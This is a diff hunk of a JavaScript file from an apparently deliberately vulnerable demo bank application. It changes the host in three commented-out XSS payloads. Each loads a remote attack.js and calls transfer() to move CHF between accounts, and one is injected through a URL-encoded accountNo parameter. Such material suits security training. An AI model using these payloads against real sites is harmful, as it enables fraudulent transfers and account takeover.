@@ -70,9 +70,9 @@ function submitTransferForm(formname, fromAccount) {
     }
 }
 
-//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","100","CHF")</script>
-//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob2","1-123456-11","3-123456-33","10000","CHF")</script>
-//http://localhost:8080/history?accountNo=1-123456-11%27+--+%3Cscript+src=%22http://localhost:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-123456-11%22,%223-123456-33%22,%22800%22,%22CHF%22)%3C/script%3E
+//<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","100","CHF")</script>
+//<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob2","1-123456-11","3-123456-33","10000","CHF")</script>
+//http://v-bank.0.0.0.0.xip.io:8080/history?accountNo=1-123456-11%27+--+%3Cscript+src=%22http://attack.0.0.0.0.xip.io:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-123456-11%22,%223-123456-33%22,%22800%22,%22CHF%22)%3C/script%3E
 
 // dec2hex :: Integer -> String
 function dec2hex (dec) {
